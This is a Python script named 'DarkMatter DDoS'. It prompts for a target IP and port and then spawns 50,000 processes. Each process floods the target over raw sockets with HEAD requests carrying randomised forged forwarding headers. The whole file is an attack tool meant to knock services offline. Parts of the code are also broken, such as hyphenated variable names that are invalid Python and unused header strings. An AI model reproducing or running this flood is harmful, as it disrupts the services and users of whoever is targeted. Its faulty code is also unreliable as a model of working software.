import socket
import os
from time import sleep
import multiprocessing
import random
import platform
import socks
import threading
import re
import urllib.request

import sys 

def progressbar(it, prefix="", size=60, file=sys.stdout):
    count = len(it)
    def show(j):
        x = int(size*j/count) 
        file.write("%s[%s%s] %i/%i\r" % (prefix,  "="*x, "~"*(size-x), j, count))
        file.flush()
        file.write("\n")
    show(0)
    for i, item in enumerate(it):
        yield item
        show(i+1)
        file.write("\n")
    file.flush()
    
import time

for i in progressbar(range(10), "Barra Util: ", 40):
    time.sleep(0.3)
    
    
print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
print("Detecting System...")
sysOS = platform.system()
print("System detected: ", sysOS)

if sysOS == "Linux":
  try:
    os.system("ulimit -n 30")
  except Exception as e:
    print(e)
    print("No se pudo iniciar el script")
else:
  print("Su sistema no es Linux, es posible que no pueda ejecutar este script en algunos sistemas")


def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip


def attack():
  Upgrade = "websocket\r\n"
  Connection = "Upgrade\r\n"
  Host = "192.168.56.103:8080\r\n"
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  Pragma = "no-cache\r\n"
  Cache-Control = "no-cache\r\n"
  Sec-WebSocket-Key = "+vTyWP1c0t5S5WaThYZEMw==\r\n"
  Sec-WebSocket-Version = "13\r\n"
  Sec-WebSocket-Extensions = "x-webkit-deflate-frame\r\n"
  User-Agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36\r\n"	
  forward = "X-Forwarded-Proto: " + randomip() + "\r\n"
  get_host = "HEAD "  + url + " HTTP/3.0\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80,8080):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass

print("Bienvenido a DarkMatter DDoS\n")
ip = input("IP/Domain: ")
port = int(input("Port: "))
url = f"http://{str(ip)}"
print("[>>>] RS-28 Sarmat [<<<]")
sleep(1)

	
def send3attack():
  for i in range(50000): #Poder mágico
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = True
    mp.start() #Magic Starts

    
send3attack()
exit("Enter")
